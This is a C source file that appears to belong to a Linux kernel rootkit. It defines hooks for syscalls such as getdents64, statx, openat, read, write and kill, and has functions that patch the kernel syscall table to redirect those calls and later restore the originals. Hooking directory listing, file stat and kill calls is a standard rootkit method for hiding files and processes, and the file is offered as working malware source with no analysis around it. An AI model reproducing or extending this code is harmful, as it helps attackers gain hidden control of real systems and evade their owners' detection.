#include "inc/hook.h"
#include "inc/util.h"

struct hook {
  uint16_t num;    // syscall number (nr, rax)
  char *name;      // syscall name (only used for debugging)
  syscall_t *func; // hook function
  syscall_t *orig; // original function
};

struct hook hooks[] = {
    {.num = __NR_newfstatat, .name = "newfstatat", .func = h_newfstatat},
    {.num = __NR_getdents64, .name = "getdents64", .func = h_getdents64},
    {.num = __NR_getdents, .name = "getdents", .func = h_getdents},
    {.num = __NR_openat, .name = "openat", .func = h_openat},
    {.num = __NR_statx, .name = "statx", .func = h_statx},
    {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
    {.num = __NR_write, .name = "write", .func = h_write},
    {.num = __NR_read, .name = "read", .func = h_read},
    {.num = __NR_open, .name = "open", .func = h_openat},
    {.num = __NR_kill, .name = "kill", .func = h_kill},
};

#define hook_count() (sizeof(hooks) / sizeof(hooks[0]))

bool hooks_setup(uint64_t **systable) {
  uint8_t i = 0;

  for (; i < hook_count(); i++) {
    hooks[i].orig = (void *)systable[hooks[i].num]; // save the old syscall
    systable[hooks[i].num] =
        (uint64_t *)hooks[i].func; // replace it with the hooked call
    debgf("%s: 0x%px -> 0x%px", hooks[i].name, hooks[i].orig,
          systable[hooks[i].num]);
  }

  return true;
}

bool hooks_clean(uint64_t **systable) {
  uint8_t i = 0;

  for (; i < hook_count(); i++) {
    systable[hooks[i].num] =
        (uint64_t *)hooks[i].orig; // load the old syscall back again
    debgf("%s: 0x%px -> 0x%px", hooks[i].name, hooks[i].func, hooks[i].orig);
  }

  return true;
}

syscall_t *hooks_find_orig(uint16_t num) {
  uint8_t i = 0;

  for (; i < hook_count(); i++)
    if (hooks[i].num == num)
      return hooks[i].orig;

  return NULL;
}
